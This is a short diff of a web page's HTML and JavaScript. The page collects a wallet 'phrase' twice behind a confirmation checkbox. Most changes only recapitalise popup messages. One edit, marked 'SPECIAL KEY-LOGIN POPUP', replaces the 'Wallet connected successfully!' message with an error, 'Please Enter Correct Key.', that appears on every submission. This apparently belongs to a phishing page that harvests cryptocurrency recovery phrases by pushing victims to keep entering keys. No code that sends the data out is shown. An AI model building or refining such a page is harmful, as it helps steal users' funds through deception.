@@ -142,7 +142,7 @@
 
     <!-- POPUP -->
     <div id="popup">
-      <p id="popupMsg">Please fill out this field.</p>
+      <p id="popupMsg">Please Fill Out This Field.</p>
       <button onclick="closePopup()">OK</button>
     </div>
 
@@ -168,12 +168,13 @@
         const p2 = phrase2.value.trim();
         const check = confirmCheck.checked;
 
-        if (p1 === "") return showPopup("Please enter your phrase.");
-        if (p2 === "") return showPopup("Please confirm the phrase.");
-        if (p1 !== p2) return showPopup("Phrases do not match.");
-        if (!check) return showPopup("Please tick the confirmation checkbox.");
+        if (p1 === "") return showPopup("Please Enter Your Phrase.");
+        if (p2 === "") return showPopup("Please Confirm The Phrase.");
+        if (p1 !== p2) return showPopup("Phrases Do Not Match.");
+        if (!check) return showPopup("Please Tick The Confirmation Checkbox.");
 
-        showPopup("Wallet connected successfully!");
+        // 🔥 SPECIAL KEY-LOGIN POPUP
+        return showPopup("Please Enter Correct Key.");
       }
 
       function showPopup(msg) {
